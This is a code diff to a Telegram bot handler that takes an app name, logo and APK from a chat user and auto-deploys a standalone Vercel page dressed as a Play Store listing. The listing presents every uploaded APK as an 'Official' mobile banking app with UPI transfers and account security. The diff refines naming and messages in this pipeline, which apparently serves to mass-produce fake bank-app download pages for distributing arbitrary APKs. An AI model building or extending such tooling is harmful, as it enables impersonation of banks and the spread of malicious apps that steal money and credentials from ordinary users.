@@ -191,7 +191,7 @@ export default async function handler(request, response) {
 			}
 		}
 
-		const text = (message?.text || '').trim();
+		const text = (message?.text || message?.caption || '').trim();
 		const isImagePhoto = Array.isArray(message?.photo) && message.photo.length > 0;
 		const isImageDoc = !!(
 			message?.document?.mime_type?.startsWith('image/') ||
@@ -207,7 +207,7 @@ export default async function handler(request, response) {
 			await saveSession(chatId, { step: 'name', data: {} });
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: '✅ Process started\n\n1/3 App ka naam Bhejiye.',
+				text: '✅ Process started\n\n1/3 App ka naam Bhejiye (e.g. abcde).',
 			});
 			return response.status(200).json({ ok: true });
 		}
@@ -220,26 +220,42 @@ export default async function handler(request, response) {
 				? message.photo[message.photo.length - 1].file_id
 				: message.document.file_id;
 
+			// If photo came with a caption and name wasn't set, use caption as app name!
+			if (text && !text.startsWith('/') && (!session.data.name || session.data.name === 'App')) {
+				session.data.name = text;
+				session.data.developer = `${text} Official`;
+			}
+
 			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo image...' });
 			session.data.logoFileId = fileId;
 			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
 			session.step = 'apk';
 			if (!session.data.name) {
-				session.data.name = 'App';
-				session.data.developer = 'App Official';
+				session.data.name = 'abcde';
+				session.data.developer = 'abcde Official';
 			}
 			await saveSession(chatId, session);
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: '✅ 2/3 App icon received\n\n3/3 Ab APK document bhejiye (.apk file).',
+				text: `✅ 2/3 App logo received for [${session.data.name}]\n\n3/3 Ab APK document bhejiye (.apk file).`,
 			});
 			return response.status(200).json({ ok: true });
 		}
 
 		// 2. If user sent an APK Document (Step 3)
 		if (isApkDoc) {
-			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & deploying your standalone Play Store page...' });
-			const slug = generateProjectSlug(session.data.name || 'app');
+			// If APK came with caption and name was not set
+			if (text && !text.startsWith('/') && (!session.data.name || session.data.name === 'App')) {
+				session.data.name = text;
+				session.data.developer = `${text} Official`;
+			}
+
+			const appName = session.data.name || 'abcde';
+			const slug = generateProjectSlug(appName);
+			await telegram('sendMessage', { 
+				chat_id: chatId, 
+				text: `⏳ Uploading APK & creating standalone domain: https://${slug}.vercel.app...` 
+			});
 			
 			// Save APK and Logo permanently under the unique project slug
 			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${slug}/base.apk`);
@@ -254,10 +270,10 @@ export default async function handler(request, response) {
 			const apkUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`;
 
 			const appRecord = {
-				name: session.data.name || 'App',
-				developer: session.data.developer || `${session.data.name || 'App'} Official`,
+				name: appName,
+				developer: session.data.developer || `${appName} Official`,
 				tagline: 'Secure Mobile Banking, Instant UPI Transfers & Financial Services',
-				description: `Official ${session.data.name || 'App'} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
+				description: `Official ${appName} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
 				version: '2.4.1',
 				logoUrl,
 				apkUrl,
@@ -270,7 +286,7 @@ export default async function handler(request, response) {
 
 			let liveUrl = `https://${slug}.vercel.app`;
 
-			// Deploy standalone project to Vercel (e.g. https://hello-qjoa.vercel.app)
+			// Deploy standalone project to Vercel (e.g. https://abcde-qjoa.vercel.app)
 			if (vercelToken) {
 				try {
 					const html = buildStandaloneHtml(appRecord);
@@ -327,7 +343,7 @@ export default async function handler(request, response) {
 			await saveSession(chatId, session);
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
+				text: `✅ 1/3 App name received: "${text}"\n\n2/3 Ab app ka logo / icon image Bhejiye.`,
 			});
 			return response.status(200).json({ ok: true });
 		}
